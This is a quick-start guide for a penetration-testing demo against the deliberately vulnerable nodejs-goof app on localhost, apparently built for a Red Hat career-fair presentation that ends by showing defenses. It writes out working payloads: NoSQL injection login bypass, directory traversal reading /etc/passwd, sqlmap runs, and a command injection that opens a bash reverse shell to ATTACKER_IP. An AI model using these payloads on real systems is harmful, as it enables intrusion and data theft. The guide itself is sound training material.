# Kali Linux Exploitation - Quick Start Guide

**Target**: nodejs-goof vulnerable application
**Purpose**: Red Hat Cybersecurity Engineering Demo

---

## 🚀 Quick Start (3 Commands)

```bash
# 1. Run automated Python exploit
python3 kali_exploit.py -t http://localhost:3001

# 2. Run specific exploit
python3 kali_exploit.py -e nosql

# 3. Run Nikto scan
nikto -h http://localhost:3001
```

---

## 📦 File Structure

```
nodejs-goof/
├── kali_exploit.py                  → Automated exploitation script
├── KALI_EXPLOITATION_GUIDE.md       → Complete tool documentation
├── KALI_QUICK_START.md              → This file
└── attack-menu.sh                   → Interactive menu (non-Kali)
```

---

## 🛠️ Top 10 Kali Tools for nodejs-goof

| Priority | Tool | Purpose | Quick Command |
|----------|------|---------|---------------|
| **1** | **Python Script** | Automated exploitation | `python3 kali_exploit.py` |
| **2** | **Burp Suite** | Manual testing | `burpsuite` |
| **3** | **OWASP ZAP** | Automated scanning | `zap-baseline.py -t URL` |
| **4** | **SQLMap** | NoSQL injection | `sqlmap -u URL --data=JSON` |
| **5** | **Nmap** | Reconnaissance | `nmap -sV -p 3001 localhost` |
| **6** | **Nikto** | Web scanner | `nikto -h URL` |
| **7** | **Wfuzz** | Fuzzing | `wfuzz -z file,wordlist URL/FUZZ` |
| **8** | **Netcat** | Reverse shell | `nc -lvnp 4444` |
| **9** | **Hydra** | Brute force | `hydra -l USER -P PASS host http-post-form` |
| **10** | **Metasploit** | Framework | `msfconsole` |

---

## ⚡ 5-Minute Demonstration

```bash
# Step 1: Reconnaissance (1 min)
nmap -sV -p 3001 localhost
whatweb http://localhost:3001

# Step 2: Automated Exploitation (2 min)
python3 kali_exploit.py

# Step 3: Manual Exploitation - NoSQL Injection (1 min)
curl -X POST http://localhost:3001/login \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin@snyk.io", "password": {"$gt": ""}}'

# Step 4: Directory Traversal (1 min)
curl 'http://localhost:3001/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```

---

## 📊 Python Exploitation Script Usage

### Run All Exploits
```bash
python3 kali_exploit.py --target http://localhost:3001
```

### Run Specific Exploits
```bash
# NoSQL injection
python3 kali_exploit.py -e nosql

# Directory traversal
python3 kali_exploit.py -e traversal

# XSS
python3 kali_exploit.py -e xss

# Command injection
python3 kali_exploit.py -e cmdinj

# Prototype pollution
python3 kali_exploit.py -e proto

# Information disclosure
python3 kali_exploit.py -e info
```

### Custom Parameters
```bash
# Custom file for directory traversal
python3 kali_exploit.py -e traversal -f "./../.env"

# Custom command for command injection
python3 kali_exploit.py -e cmdinj -c "whoami > /tmp/user.txt"
```

---

## 🔍 Complete Workflow (20 Minutes)

### Phase 1: Reconnaissance (5 min)
```bash
nmap -sV -sC -p 3001 -oA scan localhost
whatweb -v http://localhost:3001
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  --hc 404 http://localhost:3001/FUZZ
```

### Phase 2: Vulnerability Scanning (5 min)
```bash
nikto -h http://localhost:3001 -o nikto.html -Format html
zap-baseline.py -t http://localhost:3001 -r zap.html
npm audit --json > audit.json
```

### Phase 3: Exploitation (5 min)
```bash
# Automated
python3 kali_exploit.py

# Manual with SQLMap
sqlmap -u "http://localhost:3001/login" \
  --data='{"username":"admin@snyk.io","password":"test"}' \
  --headers="Content-Type: application/json" \
  --level=5 --risk=3 --batch
```

### Phase 4: Post-Exploitation (5 min)
```bash
# Setup listener
nc -lvnp 4444

# Trigger reverse shell via command injection
curl -X POST http://localhost:3001/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'content=![alt text](https://x.com/i.png;bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" "Image")'

# Exfiltrate data
curl 'http://localhost:3001/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd' > passwd.txt
```

---

## 🎯 Demo Scenarios

### Scenario A: Quick Impact (5-10 min)
```
1. python3 kali_exploit.py
2. Show summary of 6/6 successful exploits
3. Demonstrate one manual exploit (NoSQL injection)
```

### Scenario B: Professional Pentest (15-20 min)
```
1. Nmap + Nikto reconnaissance
2. Burp Suite spider + active scan
3. python3 kali_exploit.py
4. Manual exploitation with Burp Repeater
5. Post-exploitation (reverse shell)
```

### Scenario C: Red Team Assessment (30-40 min)
```
1. Full reconnaissance (Nmap, Whatweb, Wfuzz)
2. Vulnerability scanning (ZAP, Nikto, NPM Audit)
3. Manual testing (Burp Suite)
4. Automated exploitation (Python + SQLMap)
5. Post-exploitation (shell, data exfiltration, persistence)
6. Report generation (Dradis)
```

---

## 🛡️ Red Hat Defense Integration

After demonstrating attacks, show Red Hat defenses:

```bash
# SELinux - Confines compromised processes
getenforce
sudo setenforce 1

# SCAP - Compliance scanning
oscap xccdf eval --profile pci-dss /usr/share/xml/scap/ssg/content/ssg-rhel8-ds.xml

# Podman - Container security
podman scan nodejs-goof:latest

# Firewalld - Network segmentation
firewall-cmd --list-all
```

---

## 📋 Checklist Before Demo

- [ ] nodejs-goof app running (http://localhost:3001)
- [ ] MongoDB container active
- [ ] Python 3 installed with `requests` module
- [ ] kali_exploit.py executable (`chmod +x`)
- [ ] Burp Suite configured (if using)
- [ ] Network connectivity confirmed
- [ ] Backup slides ready (in case of tech issues)

---

## 🔧 Troubleshooting

### Python Script Errors
```bash
# Install dependencies
pip3 install requests

# Test connection
curl -I http://localhost:3001
```

### Tool Not Found
```bash
# Install Kali tools
sudo apt update
sudo apt install nikto sqlmap zaproxy burpsuite hydra
```

### Application Not Responding
```bash
# Restart app
pkill -f "node app.js"
cd /path/to/nodejs-goof
npm start &
```

---

## 📚 Documentation Files

- `KALI_EXPLOITATION_GUIDE.md` - Complete guide (15+ tools)
- `KALI_QUICK_START.md` - This file
- `kali_exploit.py` - Automated exploitation script
- `ATTACK_REFERENCE.md` - Manual attack commands
- `REVERSE_CAREER_FAIR_DEMO.md` - Presentation guide

---

## ✅ Success Criteria

- ✅ Demonstrated professional Kali Linux tools
- ✅ Showed automated and manual exploitation
- ✅ Explained attack vectors clearly
- ✅ Connected to Red Hat defensive solutions
- ✅ Answered technical questions confidently

---

**Ready to demonstrate professional penetration testing skills!** 🔒

**For detailed documentation, see**: `KALI_EXPLOITATION_GUIDE.md`
